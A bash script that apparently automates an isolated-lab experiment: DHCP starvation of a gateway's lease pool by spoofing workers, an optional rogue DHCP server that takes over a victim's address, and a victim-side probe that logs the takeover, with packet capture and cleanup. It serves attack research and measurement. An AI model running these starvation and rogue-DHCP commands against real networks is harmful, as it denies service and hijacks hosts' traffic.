#!/usr/bin/env bash
set -euo pipefail

USER_PCAP_ENABLE="${PCAP_ENABLE-}"
USER_DHCP_STARVATION_WORKERS="${DHCP_STARVATION_WORKERS-}"
USER_TAKEOVER_ENABLE="${TAKEOVER_ENABLE-}"

# shellcheck source=/dev/null
source "$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)/common.sh"

PCAP_ENABLE="${USER_PCAP_ENABLE:-1}"
case "${FULL_PCAPS:-0}" in
  1|true|TRUE|yes|YES|on|ON)
    PCAP_RETENTION_POLICY="${PCAP_RETENTION_POLICY:-all}"
    GUEST_PCAP_ENABLE="${GUEST_PCAP_ENABLE:-1}"
    PCAP_SUMMARIES_ENABLE="${PCAP_SUMMARIES_ENABLE:-1}"
    ;;
  *)
    PCAP_RETENTION_POLICY="first-run-per-scenario"
    GUEST_PCAP_ENABLE="0"
    PCAP_SUMMARIES_ENABLE="0"
    ;;
esac

DURATION="${1:-${DURATION:-90}}"
WORKERS="${2:-${USER_DHCP_STARVATION_WORKERS:-1}}"
TAKEOVER_ENABLE="${3:-${USER_TAKEOVER_ENABLE:-1}}"
case "${TAKEOVER_ENABLE}" in
  1|true|TRUE|yes|YES|on|ON) TAKEOVER_ENABLE="1" ;;
  *) TAKEOVER_ENABLE="0" ;;
esac
TAKEOVER_START_MODE="${TAKEOVER_START_MODE:-pool-full}"
case "${TAKEOVER_START_MODE}" in
  pool-full|fixed) ;;
  *) TAKEOVER_START_MODE="pool-full" ;;
esac
ROGUE_OFFSET=""
ROGUE_IP=""
ROGUE_DELAY="${ROGUE_DHCP_START_DELAY_SECONDS:-2}"
RENEW_INTERVAL="${TAKEOVER_RENEW_INTERVAL_SECONDS:-5}"
RENEW_DELAY="${TAKEOVER_RENEW_DELAY_SECONDS:-3}"
STARVATION_RAPID_INTERVAL="${STARVATION_RAPID_INTERVAL:-2.0}"
STARVATION_RAPID_PASSES="${STARVATION_RAPID_PASSES:-1}"
STARVATION_MODE="${STARVATION_MODE:-confirmed}"
case "${STARVATION_MODE}" in
  confirmed|rapid) ;;
  *) STARVATION_MODE="confirmed" ;;
esac
STARVATION_TARGET_LEASES="${STARVATION_TARGET_LEASES:-98}"
STARVATION_CONFIRMED_INTERVAL="${STARVATION_CONFIRMED_INTERVAL:-0.05}"
STARVATION_REQUEST_TIMEOUT="${STARVATION_REQUEST_TIMEOUT:-3.0}"
REMOTE_ROOT="$(research_workspace_root)"
if [[ "${STARVATION_MODE}" == "rapid" ]]; then
  ATTACK_CMD="cd '${REMOTE_ROOT}' && exec env PYTHONPATH='./python' python3 -m mitm.cli --config ./lab.conf dhcp-starvation --interface vnic0 --interval ${STARVATION_RAPID_INTERVAL} --request-timeout ${STARVATION_REQUEST_TIMEOUT} --workers ${WORKERS} --no-release-on-exit --rapid-pool --pool-start ${LAB_DHCP_RANGE_START} --pool-end ${LAB_DHCP_RANGE_END} --rapid-passes ${STARVATION_RAPID_PASSES}"
else
  ATTACK_CMD="cd '${REMOTE_ROOT}' && exec env PYTHONPATH='./python' python3 -m mitm.cli --config ./lab.conf dhcp-starvation --interface vnic0 --interval ${STARVATION_CONFIRMED_INTERVAL} --request-timeout ${STARVATION_REQUEST_TIMEOUT} --workers ${WORKERS} --cycles ${STARVATION_TARGET_LEASES} --no-release-on-exit"
fi
AUX_CMD=""
MONITOR_CMD="$(dhcp_lease_monitor_cmd "${DURATION}" 1)"
VICTIM_CMD=""
RUN_SUFFIX="param-workers-${WORKERS}-lease-flood"
RUN_NOTES="Automated DHCP starvation lease-pool flood with ${WORKERS} spoofing workers in the isolated lab"
AUX_TRIGGER_MODE=""
VICTIM_TRIGGER_MODE=""
if [[ "${TAKEOVER_ENABLE}" == "1" ]]; then
  ROGUE_OFFSET="${ROGUE_DHCP_START_OFFSET_SECONDS:-10}"
  ROGUE_IP="${ROGUE_DHCP_OFFERED_IP:-10.20.20.254}"
  RENEW_OFFSET="$((ROGUE_OFFSET + 5))"
  if [[ "${TAKEOVER_START_MODE}" == "pool-full" ]]; then
    ROGUE_OFFSET=""
    RENEW_OFFSET="${RENEW_DELAY}"
    AUX_TRIGGER_MODE="dhcp-pool-full"
    VICTIM_TRIGGER_MODE="dhcp-pool-full"
    AUX_CMD="sleep ${ROGUE_DELAY}; cd '${REMOTE_ROOT}' && exec env PYTHONPATH='./python' python3 -m mitm.cli --config ./lab.conf dhcp-spoof --interface vnic0 --interval 2.0 --reactive --offered-ip ${ROGUE_IP}"
  else
    AUX_CMD="sleep ${ROGUE_OFFSET}; cd '${REMOTE_ROOT}' && exec env PYTHONPATH='./python' python3 -m mitm.cli --config ./lab.conf dhcp-spoof --interface vnic0 --interval 2.0 --reactive --offered-ip ${ROGUE_IP}"
  fi
  VICTIM_CMD="$(cat <<EOF
sleep ${RENEW_OFFSET}
python3 - '${ROGUE_IP}' '${DURATION}' '${RENEW_INTERVAL}' <<'PY'
from datetime import datetime, timezone
import json
import subprocess
import sys
import time

rogue_ip = sys.argv[1]
duration = float(sys.argv[2])
interval = max(float(sys.argv[3]), 1.0)

def emit(event, **payload):
    print(json.dumps({'ts': datetime.now(timezone.utc).isoformat(), 'event': event, **payload}, sort_keys=True), flush=True)

def run(command):
    return subprocess.run(command, shell=True, text=True, capture_output=True, timeout=25)

deadline = time.time() + max(duration - ${RENEW_OFFSET}, interval)
attempt = 0
while True:
    attempt += 1
    emit('dhcp_takeover_renew_started', rogue_ip=rogue_ip, attempt=attempt)
    run('dhclient -r vnic0 >/dev/null 2>&1 || true')
    renew = run('(dhclient -v vnic0 || networkctl renew vnic0 || true) 2>&1')
    addr = run("ip -4 -o addr show dev vnic0 | tr -s ' ' | cut -d' ' -f4 | cut -d/ -f1")
    route = run('ip route show default || true')
    dns = run('resolvectl dns vnic0 2>/dev/null || true')
    ips = [line.strip() for line in addr.stdout.splitlines() if line.strip()]
    takeover_observed = rogue_ip in ips
    emit(
        'dhcp_takeover_renew_finished',
        rogue_ip=rogue_ip,
        attempt=attempt,
        victim_ips=ips,
        takeover_observed=takeover_observed,
        default_route=route.stdout.strip(),
        dns=dns.stdout.strip(),
        renew_returncode=renew.returncode,
    )
    if takeover_observed or time.time() >= deadline:
        break
    time.sleep(interval)
PY
EOF
)"
  RUN_SUFFIX="param-workers-${WORKERS}-takeover"
  RUN_NOTES="Automated DHCP starvation with ${WORKERS} spoofing workers followed by rogue DHCP replies in the isolated lab"
fi
CLEANUP_CMD="$(dhcp_starvation_gateway_cleanup_cmd)"
CLEANUP_CMD="${CLEANUP_CMD//__PREFIX__/${DHCP_STARVATION_MAC_PREFIX,,}}"

PLAN_DURATION_SECONDS="${DURATION}" \
PLAN_FORWARDING_ENABLED="0" \
PLAN_DNS_SPOOF_ENABLED="0" \
DHCP_STARVATION_WORKERS="${WORKERS}" \
ROGUE_DHCP_START_OFFSET_SECONDS="${ROGUE_OFFSET}" \
ROGUE_DHCP_OFFERED_IP="${ROGUE_IP}" \
TAKEOVER_ENABLE="${TAKEOVER_ENABLE}" \
TAKEOVER_START_MODE="${TAKEOVER_START_MODE}" \
TAKEOVER_RENEW_DELAY_SECONDS="${RENEW_DELAY}" \
RUN_SLUG_SUFFIX="${RUN_SUFFIX}" \
AUX_JOB_HOST="attacker" \
AUX_JOB_LABEL="dhcp-spoof" \
AUX_JOB_CMD="${AUX_CMD}" \
AUX_JOB_USE_SUDO="1" \
AUX_JOB_TRIGGER_MODE="${AUX_TRIGGER_MODE}" \
MONITOR_JOB_HOST="gateway" \
MONITOR_JOB_LABEL="dhcp-lease-monitor" \
MONITOR_JOB_CMD="${MONITOR_CMD}" \
MONITOR_JOB_USE_SUDO="1" \
VICTIM_JOB_HOST="victim" \
VICTIM_JOB_LABEL="dhcp-takeover-probe" \
VICTIM_JOB_CMD="${VICTIM_CMD}" \
VICTIM_JOB_USE_SUDO="1" \
VICTIM_JOB_TRIGGER_MODE="${VICTIM_TRIGGER_MODE}" \
POST_CLEANUP_HOST="gateway" \
POST_CLEANUP_LABEL="dhcp-starvation-cleanup" \
POST_CLEANUP_CMD="${CLEANUP_CMD}" \
POST_CLEANUP_USE_SUDO="1" \
run_automated_scenario_recording \
  "dhcp-starvation-rogue-dhcp" \
  "${DURATION}" \
  "${RUN_NOTES}" \
  "dhcp-starvation" \
  "${ATTACK_CMD}"
